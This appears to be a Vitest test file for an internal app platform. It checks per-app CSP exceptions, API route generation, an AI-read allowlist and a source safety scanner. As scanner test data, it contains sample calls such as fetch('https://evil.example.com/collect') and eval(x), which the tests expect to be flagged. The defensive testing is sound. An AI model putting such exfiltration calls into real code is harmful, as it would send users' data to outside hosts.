import { describe, expect, it } from 'vitest';
import { CAPABILITIES, capabilitiesFor, loadAppCapabilities } from './capabilities.mjs';
import { scanSource } from './check-safety.mjs';
import { CSP, toSwaConfig } from './manifests.mjs';

const manifest = { name: 'x', description: 'x', category: 'サポート', owner: 'x', status: 'available', access: ['authenticated'] };
const apps = [
  { dept: 'cp', app: 'tasukuri', manifest },
  { dept: 'bm', app: 'equipment', manifest },
];
const caps = { 'cp-tasukuri': ['microsoft-graph-mail', 'platform-api'] };

describe('アプリごとの例外（ケイパビリティ）', () => {
  it('登録ファイルの名前はすべて定義済み', () => {
    const map = loadAppCapabilities();
    for (const list of Object.values(map)) for (const c of list) expect(CAPABILITIES[c]).toBeDefined();
  });

  it('許可されたアプリだけ、CSP に Microsoft の通信先が追加され、API のルートができる', () => {
    const { routes } = toSwaConfig(apps, caps);
    const taskuri = routes.find((r) => r.route === '/cp/tasukuri/*');
    expect(taskuri.headers['Content-Security-Policy']).toContain('connect-src \'self\' https://graph.microsoft.com https://login.microsoftonline.com');
    expect(routes.find((r) => r.route === '/bm/equipment/*').headers).toBeUndefined();
    expect(routes.find((r) => r.route === '/api/cp-tasukuri/*').allowedRoles).toEqual(['authenticated']);
    expect(routes.findIndex((r) => r.route === '/api/cp-tasukuri/*')).toBeLessThan(routes.findIndex((r) => r.route === '/*'));
  });

  it('AI 読み取りを許可されたアプリだけ、/api/ai/<id>/* のルートと許可リストができる', async () => {
    const { toAiAllowlist } = await import('./manifests.mjs');
    const limited = { ...manifest, access: ['cp_contract'] };
    const list = [...apps, { dept: 'cp', app: 'contract', manifest: limited }];
    const aiCaps = { ...caps, 'cp-contract': ['ai-document'] };
    const { routes } = toSwaConfig(list, aiCaps);
    expect(routes.find((r) => r.route === '/api/ai/cp-contract/*').allowedRoles).toEqual(['authenticated']);
    expect(routes.find((r) => r.route === '/api/ai/cp-tasukuri/*')).toBeUndefined();
    expect(routes.findIndex((r) => r.route === '/api/ai/cp-contract/*')).toBeLessThan(routes.findIndex((r) => r.route === '/*'));
    expect(toAiAllowlist(list, aiCaps)).toEqual({ 'cp-contract': ['cp_contract'] });
    expect(scanSource("const r = await fetch(`/api/ai/cp-contract/extract`);", capabilitiesFor('cp-contract', aiCaps))).toEqual([]);
  });

  it('標準の CSP は変わらない（外部への送信は禁止のまま）', () => {
    expect(CSP).toContain("connect-src 'self';");
    expect(CSP).toContain("frame-src 'none'");
  });

  it('禁止パターン：許可されたホストへの通信だけを見逃し、それ以外の外部URLは検出する', () => {
    const allow = capabilitiesFor('cp-tasukuri', caps);
    expect(scanSource("await fetch('https://graph.microsoft.com/v1.0/me')", allow)).toEqual([]);
    expect(scanSource("await fetch('https://evil.example.com/collect')", allow).map((f) => f.rule)).toEqual(['external-url']);
    expect(scanSource('eval(x)', allow).map((f) => f.rule)).toEqual(['eval']);
    // 例外のないアプリは従来どおり
    expect(scanSource("await fetch('https://graph.microsoft.com/v1.0/me')").map((f) => f.rule)).toEqual(['external-url', 'network']);
  });
});

describe('宣言制の読み取り（readFrom）', () => {
  it('宣言したサイトの URL と、読み取り API の呼び出しは禁止パターンにならない。宣言外は検出する', async () => {
    const { withReadFrom } = await import('./capabilities.mjs');
    const allow = withReadFrom(capabilitiesFor('cp-wnw2', {}), ['www.midac.jp']);
    expect(scanSource("await fetch('/api/read/cp-wnw2?url=' + encodeURIComponent('https://www.midac.jp/news/'))", allow)).toEqual([]);
    expect(scanSource("fetch('https://evil.example.com/collect')", allow).map((f) => f.rule)).toEqual(['external-url']);
    // 宣言がなければ従来どおり
    expect(scanSource("fetch('/api/read/x')").map((f) => f.rule)).toEqual(['network']);
  });

  it('宣言したアプリだけ、読み取り API のルートができ、ブラウザの CSP は変わらない', () => {
    const withRead = [{ dept: 'cp', app: 'wnw2', manifest: { ...manifest, readFrom: ['www.midac.jp'] } }];
    const { routes } = toSwaConfig(withRead, {});
    expect(routes.find((r) => r.route === '/api/read/cp-wnw2*').allowedRoles).toEqual(['authenticated']);
    expect(routes.find((r) => r.route === '/cp/wnw2/*').headers).toBeUndefined();
  });
});
